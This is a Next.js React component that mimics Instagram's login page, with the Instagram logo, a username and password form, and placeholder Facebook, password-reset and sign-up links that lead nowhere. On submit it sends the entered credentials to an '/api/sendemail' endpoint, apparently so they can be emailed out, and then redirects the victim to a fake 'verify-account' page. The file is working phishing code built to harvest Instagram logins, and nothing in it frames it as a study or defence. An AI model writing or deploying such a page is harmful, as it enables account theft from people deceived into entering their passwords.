import Link from 'next/link'
import Image from 'next/image'
import { useState } from 'react'
import { useRouter } from 'next/router'

const Instagram = () => {
    const Router = useRouter()

    const [username, setUsername] = useState()
    const [password, setPassword] = useState()

    const handleSubmit = (e) => {
      e.preventDefault();
      let data = {
          username,
          password
      }
      const jsondata = JSON.stringify(data)
      console.log(jsondata)

      fetch('/api/sendemail', {
          method: 'POST',
          body: jsondata
      }).then((res) => {
          console.log('successful')
          if (res.status === 200) {
              Router.push('/signup/verify-account')
              setUsername('')
              setPassword('')
          }
      })
    }

    return (
        <>
        <div className="h-screen w-full bg-[#FAFAFA] flex justify-center items-start">
          <div className="mt-12">
              <div className="w-[350px] h-96 bg-white border-[1px] border-solid border-[#F1F1F1] flex flex-col items-center p-2">
                       <Image
                          src="/images/insta.png"
                          className="mt-20"
                          height={70}
                          width={190}
                          alt="second hero"/>

                          <form onSubmit={(e) => handleSubmit(e)} className='mt-6 flex flex-col items-center'>
                          <input type="text" placeholder="Phone number, username, or email" id='username' name='username'onChange={(e) =>{ return setUsername(e.target.value)}} 
                            className='w-[270px] h-[35px] border-[1px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none'
                             required/>

                          <input type="password" placeholder="Password" id='password' name='password' onChange={(e) =>{return setPassword(e.target.value)}}
                            className='w-[270px] h-[35px] border-[0.5px] border-solid border-[#F1F1F1] bg-[#FAFAFA] mb-3 p-2 placeholder:text-sm focus:outline-none' 
                            required/>

                        <button type="submit" className='text-white font-semibold w-[270px] h-[35px] border-[0.5px] border-solid border-[#F1F1F1] bg-[#419CF1]'>Log In</button>
                          </form> 

                          <div className='max-w-[270px] flex justify-start items-center mt-4'>
                              <div className='h-[0.5px] w-[100px] bg-gray-300 justify-self-start'></div> 
                              <div className='text-gray-400'> OR </div> 
                              <div className='h-[0.5px] w-[100px] bg-gray-300'></div>
                          </div>

                          <div className='mt-10 text-sm font-semibold text-blue-900'><Link href='#'><a>Log in with Facebook</a></Link></div>

                          <div className='mt-6 text-xs text-blue-900'><Link href='#'><a>Forgot Password?</a></Link></div>
                          
              </div>
              <div className="w-[350px] h-16 mt-3 bg-white border-[1px] border-solid border-[#F1F1F1] flex justify-center items-center">
                  <h3 className='text-sm'>Don't have an account? <Link href='#'>
                      <a className='text-[#419CF1] font-semibold'> Sign Up</a>
                      </Link>
                      </h3>

              </div>
          </div>
        </div>
        </>
    )
}

export default Instagram